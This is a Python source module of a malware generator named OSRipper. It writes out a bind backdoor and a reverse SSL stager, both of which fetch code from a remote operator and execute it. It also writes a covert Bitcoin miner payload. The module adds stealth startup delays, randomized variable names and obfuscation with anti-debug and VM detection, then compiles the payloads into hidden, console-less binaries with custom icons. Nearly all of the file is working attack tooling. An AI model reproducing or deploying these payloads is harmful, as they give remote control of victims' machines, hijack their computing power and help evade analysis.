#!/usr/bin/env python3
"""
OSRipper Generator Module
Centralizes payload generation, obfuscation, and compilation with automatic cleanup
"""

import os
import sys
import shutil
import tempfile
import platform
import subprocess
from pathlib import Path
import secrets
import string
import random
from . import obfuscator
from . import obfuscator_enhanced

# ============================================================================
# Payload Template Generation Functions
# ============================================================================

def generate_random_string(length):
    """Generate random string for obfuscation."""
    return "".join(secrets.choice(string.ascii_letters) for _ in range(length))


def create_bind_payload(port, output_name="payload", stealth_delay=False):
    """
    Generate bind backdoor payload.
    
    Args:
        port: Port to bind to
        output_name: Name of output file
        stealth_delay: If True, add random delay (5-15 seconds) at startup
    
    Returns:
        str: Path to generated payload file
    """
    stealth_code = ""
    if stealth_delay:
        stealth_code = """import time
import random
time.sleep(random.randint(5, 15))

"""
    
    payload_content = f"""{stealth_code}port = {port}

import zlib
import base64
import socket
import struct
import time

def main():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('0.0.0.0', int(port)))
        s.listen(1)
        client, addr = s.accept()
        
        length = struct.unpack('>I', client.recv(4))[0]
        data = client.recv(length)
        
        while len(data) < length:
            data += client.recv(length - len(data))
        
        exec(zlib.decompress(base64.b64decode(data)), {{'s': client}})
        
    except Exception:
        time.sleep(10)
        main()

if __name__ == "__main__":
    main()
"""
    
    with open(output_name, 'w') as f:
        f.write(payload_content)
    
    return output_name


def create_reverse_ssl_tcp_payload(host, port, output_name="payload", stealth_delay=False):
    """
    Generate reverse SSL TCP meterpreter payload.
    
    Args:
        host: Callback IP address
        port: Callback port
        output_name: Name of output file
        stealth_delay: If True, add random delay (5-15 seconds) at startup
    
    Returns:
        str: Path to generated payload file
    """
    # Generate randomized variables
    socket_var = generate_random_string(random.randint(8, 15))
    ssl_var = generate_random_string(random.randint(8, 15))
    length_var = generate_random_string(random.randint(8, 15))
    data_var = generate_random_string(random.randint(8, 15))
    context_var = generate_random_string(random.randint(8, 15))
    host_var = generate_random_string(random.randint(8, 15))
    port_var = generate_random_string(random.randint(8, 15))
    
    stealth_code = ""
    if stealth_delay:
        stealth_code = """import time
import random
time.sleep(random.randint(15, 50))

"""
    
    payload_content = f"""{stealth_code}{port_var} = {port}
{host_var} = "{host}"

import zlib,base64,ssl,socket,struct,time
{ssl_var} = None
for x in range(10):
        try:
                {socket_var}=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                {socket_var}.settimeout(5)
                {socket_var}.connect(({host_var},{port_var}))
                {context_var} = ssl._create_unverified_context()
                {ssl_var}={context_var}.wrap_socket({socket_var})
                break
        except Exception as e:
                time.sleep(2)
if {ssl_var} is None:
        exit(1)
{length_var}=struct.unpack('>I',{ssl_var}.recv(4))[0]
{data_var}={ssl_var}.recv({length_var})
while len({data_var})<{length_var}:
        {data_var}+={ssl_var}.recv({length_var}-len({data_var}))
exec(zlib.decompress(base64.b64decode({data_var})),{{'s':{ssl_var}}})
"""
    
    with open(output_name, 'w') as f:
        f.write(payload_content)
    
    return output_name


def create_custom_payload(script_path, output_name="payload", stealth_delay=False):
    """
    Copy custom script as payload.
    
    Args:
        script_path: Path to source Python script
        output_name: Name of output file
        stealth_delay: If True, add random delay (5-15 seconds) at startup
    
    Returns:
        str: Path to generated payload file
    """
    stealth_code = ""
    if stealth_delay:
        stealth_code = """import time
import random
time.sleep(random.randint(5, 15))

"""
    
    with open(script_path, 'r') as source:
        with open(output_name, 'w') as target:
            target.write(stealth_code)
            target.write(source.read())
    
    return output_name


def create_btc_miner_payload(btc_address, output_name="payload", stealth_delay=False):
    """
    Generate Bitcoin miner payload.
    
    Args:
        btc_address: Bitcoin payout address
        output_name: Name of output file
        stealth_delay: If True, add random delay (5-15 seconds) at startup
    
    Returns:
        str: Path to generated payload file
    """
    stealth_code = ""
    if stealth_delay:
        stealth_code = """import time
import random
time.sleep(random.randint(5, 15))

"""
    
    miner_code = f'''{stealth_code}import socket
import json
import hashlib
import binascii
import time
import random

def main():
    address = "{btc_address}"
    nonce = hex(random.randint(0, 2**32-1))[2:].zfill(8)
    
    host = 'solo.ckpool.org'
    port = 3333
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        
        # Server connection
        sock.sendall(b'{{"id": 1, "method": "mining.subscribe", "params": []}}\n')
        lines = sock.recv(1024).decode().split('\\n')
        response = json.loads(lines[0])
        sub_details, extranonce1, extranonce2_size = response['result']
        
        # Authorize worker
        auth_msg = f'{{"params": ["{btc_address}", "password"], "id": 2, "method": "mining.authorize"}}\\n'
        sock.sendall(auth_msg.encode())
        
        # Mining loop
        response = b''
        while response.count(b'\\n') < 4 and not(b'mining.notify' in response):
            response += sock.recv(1024)
        
        responses = [json.loads(res) for res in response.decode().split('\\n') 
                    if len(res.strip()) > 0 and 'mining.notify' in res]
        
        if responses:
            job_id, prevhash, coinb1, coinb2, merkle_branch, version, nbits, ntime, clean_jobs = responses[0]['params']
            
            # Calculate target and mine
            target = (nbits[2:] + '00' * (int(nbits[:2], 16) - 3)).zfill(64)
            extranonce2 = '00' * extranonce2_size
            
            coinbase = coinb1 + extranonce1 + extranonce2 + coinb2
            coinbase_hash_bin = hashlib.sha256(hashlib.sha256(binascii.unhexlify(coinbase)).digest()).digest()
            
            merkle_root = coinbase_hash_bin
            for h in merkle_branch:
                merkle_root = hashlib.sha256(hashlib.sha256(merkle_root + binascii.unhexlify(h)).digest()).digest()
            
            merkle_root = binascii.hexlify(merkle_root).decode()
            merkle_root = ''.join([merkle_root[i:i+2] for i in range(0, len(merkle_root), 2)][::-1])
            
            blockheader = version + prevhash + merkle_root + nbits + ntime + nonce + \\
                '000000800000000000000000000000000000000000000000000000000000000000000000000000000000000080020000'
            
            hash_result = hashlib.sha256(hashlib.sha256(binascii.unhexlify(blockheader)).digest()).digest()
            hash_hex = binascii.hexlify(hash_result).decode()
            
            if hash_hex < target:
                payload = f'{{"params": ["{btc_address}", "{{job_id}}", "{{extranonce2}}", "{{ntime}}", "{{nonce}}"], "id": 1, "method": "mining.submit"}}\\n'
                sock.sendall(payload.encode())
        
        sock.close()
        
    except Exception:
        time.sleep(10)
        main()

if __name__ == "__main__":
    while True:
        main()
'''
    
    with open(output_name, 'w') as f:
        f.write(miner_code)
    
    return output_name


class Generator:
    """
    Centralized generator for OSRipper payloads.
    Handles obfuscation, compilation, and cleanup in a temporary workspace.
    """
    
    def __init__(self, source_file, output_name="payload", icon_path=None, quiet=False):
        """
        Initialize the Generator.
        
        Args:
            source_file: Path to the source payload file
            output_name: Base name for output files (default: "payload")
            icon_path: Optional path to icon file for compiled binary
            quiet: If True, suppress output messages
        """
        self.source_file = source_file
        self.output_name = output_name
        self.icon_path = icon_path
        self.quiet = quiet
        
        # Generate unique temp directory name
        random_suffix = ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(8))
        self.tmp_dir = os.path.join(tempfile.gettempdir(), f"osripper_build_{random_suffix}")
        
        # Track state
        self.obfuscated = False
        self.compiled = False
        self.obfuscated_file = None
        self.binary_file = None
        
        # Results directory
        self.results_dir = os.path.join(os.getcwd(), "results")
        
    def _log(self, message):
        """Print message unless in quiet mode."""
        if not self.quiet:
            print(message)
    
    def _create_tmp_workspace(self):
        """Create temporary workspace directory."""
        try:
            os.makedirs(self.tmp_dir, exist_ok=True)
            self._log(f"[*] Created temporary workspace: {self.tmp_dir}")
            return True
        except Exception as e:
            print(f"[!] Failed to create temp workspace: {e}")
            return False
    
    def obfuscate(self, enhanced=False):
        """
        Obfuscate the payload using the obfuscator module.
        
        Args:
            enhanced: If True, use enhanced obfuscator with anti-debug, VM detection, etc.
                     If False, use basic multi-layer encoding obfuscator.
        
        Returns:
            bool: True if successful, False otherwise
        """
        try:
            if enhanced:
                self._log("[*] Obfuscating payload with enhanced obfuscator (anti-debug, VM detection, etc.)...")
            else:
                self._log("[*] Obfuscating payload with basic obfuscator...")
            
            # Determine source file path
            if self.obfuscated_file:
                source = self.obfuscated_file
            else:
                source = self.source_file
            
            # Ensure source exists
            if not os.path.exists(source):
                print(f"[!] Source file not found: {source}")
                return False
            
            # Run appropriate obfuscator
            if enhanced:
                obfuscator_enhanced.MainMenu(source)
            else:
                obfuscator.MainMenu(source)
            
            # Check for obfuscated output
            base_name = os.path.basename(source)
            if base_name.endswith('.py'):
                base_name = base_name[:-3]
            
            obfuscated_name = f"{base_name}_or.py"
            
            if os.path.exists(obfuscated_name):
                self.obfuscated_file = obfuscated_name
                self.obfuscated = True
                self._log(f"[+] Payload obfuscated: {obfuscated_name}")
                return True
            else:
                print("[!] Obfuscation failed - output file not found")
                return False
                
        except Exception as e:
            print(f"[!] Obfuscation error: {e}")
            return False
    
    def compile(self):
        """
        Compile the payload to binary using Nuitka in the temp workspace.
        
        Returns:
            bool: True if successful, False otherwise
        """
        try:
            if not self._create_tmp_workspace():
                return False
            
            self._log("[*] Compiling payload to binary...")
            
            # Determine source file for compilation
            if self.obfuscated_file:
                source = self.obfuscated_file
            else:
                source = self.source_file
            
            if not os.path.exists(source):
                print(f"[!] Source file not found: {source}")
                return False
            
            # Get absolute paths
            source_abs = os.path.abspath(source)
            
            # Build Nuitka command
            cmd_parts = [
                sys.executable, "-m", "nuitka",
                "--standalone",
                "--include-module=sandboxed",
                "--disable-console",
                "--windows-disable-console",
                "--onefile",
                "--assume-yes-for-downloads",
                f"--output-dir={self.tmp_dir}"
            ]
            
            # Add platform-specific options
            system = platform.system()
            
            if system == "Darwin":
                cmd_parts.append("--macos-create-app-bundle")
                if self.icon_path and os.path.exists(self.icon_path):
                    cmd_parts.append(f"--macos-onefile-icon={os.path.abspath(self.icon_path)}")
            elif system == "Windows" or system == "Linux":
                if self.icon_path and os.path.exists(self.icon_path):
                    cmd_parts.append(f"--windows-icon-from-ico={os.path.abspath(self.icon_path)}")
            
            cmd_parts.append(source_abs)
            
            # Run compilation
            self._log(f"[*] Running Nuitka (this may take a few minutes)...")
            result = subprocess.run(
                cmd_parts,
                capture_output=True,
                text=True,
                cwd=self.tmp_dir
            )
            
            if result.returncode == 0:
                # Find the compiled binary
                binary_name = os.path.basename(source).replace('.py', '.bin')
                
                # Look for binary in tmp_dir
                possible_paths = [
                    os.path.join(self.tmp_dir, binary_name),
                    os.path.join(self.tmp_dir, os.path.basename(source).replace('.py', '')),
                    os.path.join(self.tmp_dir, os.path.basename(source).replace('.py', '.exe')),
                ]
                
                # Also check for .bin extension
                for root, dirs, files in os.walk(self.tmp_dir):
                    for file in files:
                        if file.endswith('.bin') or (file == os.path.basename(source).replace('.py', '')):
                            possible_paths.append(os.path.join(root, file))
                
                # Find the binary
                for path in possible_paths:
                    if os.path.exists(path) and os.path.isfile(path):
                        self.binary_file = path
                        break
                
                if self.binary_file:
                    self.compiled = True
                    self._log(f"[+] Compilation successful!")
                    return True
                else:
                    print("[!] Binary file not found after compilation")
                    print(f"[!] Searched in: {self.tmp_dir}")
                    return False
            else:
                print("[!] Compilation failed")
                print(f"[!] Error: {result.stderr[:500]}")  # Print first 500 chars
                return False
                
        except Exception as e:
            print(f"[!] Compilation error: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def cleanup_and_move_results(self):
        """
        Move final files to results/ directory and cleanup temp workspace.
        
        Returns:
            bool: True if successful, False otherwise
        """
        try:
            self._log("[*] Moving results and cleaning up...")
            
            # Create results directory
            os.makedirs(self.results_dir, exist_ok=True)
            
            # Move obfuscated file if it exists
            if self.obfuscated_file and os.path.exists(self.obfuscated_file):
                dest = os.path.join(self.results_dir, os.path.basename(self.obfuscated_file))
                shutil.copy2(self.obfuscated_file, dest)
                self._log(f"[+] Moved obfuscated file to: {dest}")
                
                # Remove original obfuscated file from workspace
                try:
                    os.remove(self.obfuscated_file)
                except:
                    pass
            
            # Move binary if it exists
            if self.binary_file and os.path.exists(self.binary_file):
                # Rename to output_name.bin
                binary_dest = os.path.join(self.results_dir, f"{self.output_name}.bin")
                shutil.copy2(self.binary_file, binary_dest)
                self._log(f"[+] Moved binary to: {binary_dest}")
            
            # Clean up temp directory
            if os.path.exists(self.tmp_dir):
                shutil.rmtree(self.tmp_dir)
                self._log(f"[+] Cleaned up temporary workspace")
            
            # Clean up any other build artifacts in current directory
            artifacts = [
                f"{self.output_name}.build",
                f"{self.output_name}.dist",
                f"{self.output_name}.onefile-build",
            ]
            
            if self.obfuscated_file:
                base = os.path.basename(self.obfuscated_file).replace('.py', '')
                artifacts.extend([
                    f"{base}.build",
                    f"{base}.dist",
                    f"{base}.onefile-build",
                ])
            
            for artifact in artifacts:
                if os.path.exists(artifact):
                    if os.path.isdir(artifact):
                        shutil.rmtree(artifact)
                    else:
                        os.remove(artifact)
                    self._log(f"[+] Removed artifact: {artifact}")
            
            # Clean up source payload file from workspace root
            if os.path.exists(self.source_file):
                try:
                    os.remove(self.source_file)
                except:
                    pass
            
            self._log(f"[+] Results saved to: {self.results_dir}/")
            return True
            
        except Exception as e:
            print(f"[!] Cleanup error: {e}")
            return False
    
    def generate(self, obfuscate=True, compile_binary=True, enhanced_obfuscation=False):
        """
        Main orchestrator method that runs all generation steps.
        
        Args:
            obfuscate: If True, obfuscate the payload
            compile_binary: If True, compile to binary
            enhanced_obfuscation: If True, use enhanced obfuscator (anti-debug, VM detection, etc.)
        
        Returns:
            bool: True if successful, False otherwise
        """
        try:
            # Obfuscation step
            if obfuscate:
                if not self.obfuscate(enhanced=enhanced_obfuscation):
                    print("[!] Obfuscation failed")
                    return False
            
            # Compilation step
            if compile_binary:
                if not self.compile():
                    print("[!] Compilation failed")
                    return False
            
            # Cleanup and move results
            if not self.cleanup_and_move_results():
                print("[!] Cleanup failed")
                return False
            
            self._log("\n[+] Generation completed successfully!")
            self._log(f"[*] Check the '{self.results_dir}' directory for your files")
            
            return True
            
        except Exception as e:
            print(f"[!] Generation error: {e}")
            return False
        finally:
            # Ensure temp directory is cleaned up even on failure
            if os.path.exists(self.tmp_dir):
                try:
                    shutil.rmtree(self.tmp_dir)
                except:
                    pass

